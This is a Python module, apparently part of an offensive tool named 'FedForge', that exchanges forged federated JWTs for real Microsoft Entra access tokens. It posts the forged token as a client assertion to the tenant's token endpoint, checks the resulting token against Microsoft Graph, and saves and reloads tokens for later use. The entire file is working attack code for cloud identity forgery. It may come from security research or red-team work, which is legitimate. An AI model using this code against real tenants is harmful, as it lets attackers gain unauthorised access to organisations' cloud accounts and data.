"""
FedForge - Token Exchange
Exchange forged tokens for real Entra access tokens
"""

import requests
import json
from datetime import datetime, timedelta


class TokenExchange:
    """Exchange federated tokens for Entra access tokens"""
    
    def __init__(self):
        self.token_endpoint_template = "https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token"
    
    def exchange(
        self,
        federated_token,
        tenant_id,
        client_id,
        scope="https://graph.microsoft.com/.default"
    ):
        """
        Exchange a federated token for an Entra access token
        
        Args:
            federated_token: The JWT token from your OIDC provider
            tenant_id: Azure tenant ID (GUID)
            client_id: App Registration client ID (GUID)
            scope: Token scope (default: Microsoft Graph)
        
        Returns:
            Dict containing access token and metadata
        """
        token_url = self.token_endpoint_template.format(tenant_id=tenant_id)
        
        # Prepare the token request
        data = {
            "client_id": client_id,
            "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
            "client_assertion": federated_token,
            "grant_type": "client_credentials",
            "scope": scope
        }
        
        headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }
        
        print(f"[*] Attempting token exchange...")
        print(f"[*] Token Endpoint: {token_url}")
        print(f"[*] Client ID: {client_id}")
        print(f"[*] Scope: {scope}")
        
        try:
            response = requests.post(token_url, data=data, headers=headers)
            
            if response.status_code == 200:
                result = response.json()
                
                print("\n" + "="*60)
                print("✓ Token Exchange Successful!")
                print("="*60)
                
                # Calculate expiration time
                expires_in = result.get('expires_in', 3600)
                expires_at = datetime.now() + timedelta(seconds=expires_in)
                
                print(f"Token Type:    {result.get('token_type', 'Bearer')}")
                print(f"Expires In:    {expires_in} seconds ({expires_in//60} minutes)")
                print(f"Expires At:    {expires_at.strftime('%Y-%m-%d %H:%M:%S')}")
                print(f"Scope:         {result.get('scope', scope)}")
                print("="*60 + "\n")
                
                return {
                    "success": True,
                    "access_token": result.get('access_token'),
                    "token_type": result.get('token_type'),
                    "expires_in": expires_in,
                    "expires_at": expires_at.isoformat(),
                    "scope": result.get('scope'),
                }
            else:
                error_data = response.json()
                print("\n" + "="*60)
                print("✗ Token Exchange Failed")
                print("="*60)
                print(f"Status Code:   {response.status_code}")
                print(f"Error:         {error_data.get('error', 'Unknown')}")
                print(f"Description:   {error_data.get('error_description', 'No description')}")
                print("="*60 + "\n")
                
                return {
                    "success": False,
                    "error": error_data.get('error'),
                    "error_description": error_data.get('error_description'),
                    "status_code": response.status_code
                }
        
        except requests.exceptions.RequestException as e:
            print(f"\n[!] Network error: {e}")
            return {
                "success": False,
                "error": "network_error",
                "error_description": str(e)
            }
        except Exception as e:
            print(f"\n[!] Unexpected error: {e}")
            return {
                "success": False,
                "error": "unexpected_error",
                "error_description": str(e)
            }
    
    def test_token(self, access_token, resource="https://graph.microsoft.com/v1.0/me"):
        """
        Test the access token by making an API call
        
        Args:
            access_token: Entra access token
            resource: API endpoint to test (default: Graph /me endpoint)
        
        Returns:
            Dict with test results
        """
        print(f"\n[*] Testing access token against {resource}...")
        
        headers = {
            "Authorization": f"Bearer {access_token}",
            "Content-Type": "application/json"
        }
        
        try:
            response = requests.get(resource, headers=headers)
            
            if response.status_code == 200:
                data = response.json()
                print("\n" + "="*60)
                print("✓ Token is Valid!")
                print("="*60)
                
                # Pretty print the response
                print(json.dumps(data, indent=2))
                print("="*60 + "\n")
                
                return {
                    "success": True,
                    "data": data
                }
            else:
                print(f"\n[!] API call failed with status {response.status_code}")
                print(f"Response: {response.text}")
                return {
                    "success": False,
                    "status_code": response.status_code,
                    "response": response.text
                }
        
        except Exception as e:
            print(f"\n[!] Error testing token: {e}")
            return {
                "success": False,
                "error": str(e)
            }
    
    def save_token(self, token_data, filename="access_token.json"):
        """Save token data to a file for later use"""
        try:
            with open(filename, 'w') as f:
                json.dump(token_data, f, indent=2)
            print(f"[+] Token saved to {filename}")
            return True
        except Exception as e:
            print(f"[!] Error saving token: {e}")
            return False
    
    def load_token(self, filename="access_token.json"):
        """Load token data from a file"""
        try:
            with open(filename, 'r') as f:
                token_data = json.load(f)
            
            # Check if token is expired
            if 'expires_at' in token_data:
                expires_at = datetime.fromisoformat(token_data['expires_at'])
                if datetime.now() > expires_at:
                    print(f"[!] Warning: Token expired at {expires_at}")
                else:
                    remaining = expires_at - datetime.now()
                    print(f"[+] Token valid for {remaining}")
            
            return token_data
        except FileNotFoundError:
            print(f"[!] Token file not found: {filename}")
            return None
        except Exception as e:
            print(f"[!] Error loading token: {e}")
            return None